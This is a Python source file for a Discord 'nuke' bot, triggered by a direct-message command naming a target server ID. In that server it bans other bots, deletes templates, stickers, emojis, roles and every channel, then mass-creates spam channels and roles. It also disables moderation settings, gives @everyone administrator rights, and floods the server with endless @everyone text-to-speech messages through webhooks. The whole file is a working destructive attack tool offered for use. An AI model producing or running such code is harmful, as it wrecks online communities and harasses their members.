from discord.ext import commands
import discord
import asyncio
import random

channel_name = "CHANNEL_NAME"
role_name = "ROLE_NAME"
server_name = "SERVER_NAME"
webhook_name = "WEBHOOK_NAME"
message = "MESSAGE_CONTENT"
token = "YOUR_BOT_TOKEN"


bot = commands.Bot(command_prefix="!", intents=discord.Intents.all(), help_command=None)

@bot.event
async def on_ready():
    print("Bot ready.")


async def perform_nuke(guild):

    bot_ban = [member for member in guild.members if member.bot and member != guild.me]

    for member in bot_ban:
        try:
            await member.ban()
        except:
            pass

    for template in await guild.templates():
        try:
            await template.delete()
        except:
            pass

    for sticker in guild.stickers:
        try:
            await sticker.delete()
        except:
            pass

    for emoji in guild.emojis:
        try:
            await emoji.delete()
        except:
            pass

    for role in guild.roles:
        if role != guild.default_role and role != guild.me.top_role:
            try:
                await role.delete()
            except:
                pass

    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass

    for _ in range(50):
        try:
            await guild.create_text_channel(channel_name)
            await guild.create_role(name=role_name,color=random.choice([discord.Color.red(),discord.Color.orange(),discord.Color.yellow(),discord.Color.green(),discord.Color.blue(),discord.Color.purple()]))
        except:
            pass


@bot.command()
async def nuke(ctx, server_id: int = None):
    if ctx.guild:
        return

    if server_id is None:
        await ctx.reply("**Wrong Usage!**\nCorrect Usage: `!nuke <server_id>`")
        return

    guild = bot.get_guild(server_id)
    if not guild:
        await ctx.reply(f"Server ID Not Found: `{server_id}`\nPlease Invite Bot To Server Before Using This Command.")
        return

    bot_member = guild.me
    if not bot_member.guild_permissions.administrator:
        await ctx.reply("Bot Has No Admin Permissions.")
        return

    await ctx.reply("Starting to nuke the server.")
    await perform_nuke(guild)


@bot.event
async def on_guild_channel_create(channel):
    if channel.name == channel_name:
        try:
            await channel.guild.edit(name=server_name, icon=None, system_channel=None, verification_level=discord.VerificationLevel.none, default_notifications=discord.NotificationLevel.all_messages, explicit_content_filter=discord.ContentFilter.disabled)
            await channel.guild.default_role.edit(permissions=discord.Permissions(administrator=True))

            webhooks = []
            for _ in range(2):
                webhook = await channel.create_webhook(name=webhook_name)
                webhooks.append(webhook)

            while True:
                tasks = []
                for webhook in webhooks:
                    for _ in range(5):
                        tasks.append(channel.send(f"@everyone @here\n{message}", tts=True))
                        tasks.append(webhook.send(f"@everyone @here\n{message}", tts=True))
                await asyncio.gather(*tasks)

        except discord.errors.Forbidden:
            pass


bot.run(token)
